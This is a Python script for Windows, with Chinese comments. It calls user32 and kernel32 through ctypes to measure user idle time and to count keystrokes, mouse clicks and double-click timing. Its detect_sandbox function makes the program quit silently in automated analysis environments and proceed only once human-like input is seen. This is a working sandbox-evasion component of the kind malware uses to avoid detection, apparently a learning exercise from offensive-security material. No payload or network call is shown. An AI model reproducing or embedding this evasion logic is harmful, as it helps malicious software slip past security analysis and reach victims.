import ctypes
import random
import time
import sys

user32=ctypes.windll.user32
kernel32=ctypes.windll.kernel32

keystrokes=0
mouse_clicks=0
double_clicks=0

class LASTINPUTINFO(ctypes.Structure):
    _fields_=[("cbSize",ctypes.c_uint),("dwTime",ctypes.c_ulong)]

def get_last_input():
    struct_lastinputinfo=LASTINPUTINFO()
    struct_lastinputinfo.cbSize=ctypes.sizeof(LASTINPUTINFO)

    #获得用户最后输入的相关信息
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

    #获得机器运行时间
    run_time=kernel32.GetTickCount()

    elapsed=run_time - struct_lastinputinfo.dwTime

    print("[*] It's been %d milliseconds since the last input event." % elapsed)

    return elapsed

#测试用
#while True:
#    get_last_input()
#    time.sleep(1)

def get_key_press():
    global mouse_clicks
    global keystrokes

    for i in range(0,0xff):
        if user32.GetAsyncKeyState(i) == -32767:
            #左键点击为0x1
            if i==0x1:
                mouse_clicks+=1
                return time.time()
            elif i>32 and i<127:
                keystrokes+=1

    return None

def detect_sandbox():
    global  mouse_clicks
    global  keystrokes

    max_keystrokes=random.randint(10,25)
    max_mouse_clicks=random.randint(5,25)

    double_clicks=0
    max_double_clicks=10
    double_click_threshold=0.250 #秒
    first_double_click=None

    average_mousetime=0
    max_input_threshold=30000 #毫秒

    previous_timestamp=None
    detection_complete=False

    last_input=get_last_input()

    #超过设定的阈值时强制退出
    if last_input>=max_input_threshold:
        sys.exit(0)

    while not detection_complete:
        keypress_time=get_key_press()

        if keypress_time is not None and previous_timestamp is not None:
            #计算两次点击相隔的时间
            elapsed=keypress_time - previous_timestamp

            #间隔时间短的话，则为用户双击
            if elapsed<= double_click_threshold:
                double_clicks+=1

                if first_double_click is None:
                    #获取第一次双击时的时间
                    first_double_click=time.time()

                else:
                    if double_clicks == max_double_clicks:
                        if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
                            sys.exit(0)
            #用户的输入次数达到设定的条件
            if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
                return
            
            previous_timestamp=keypress_time
        elif keypress_time is not None:
            previous_timestamp = keypress_time

detect_sandbox()
print("We are ok!")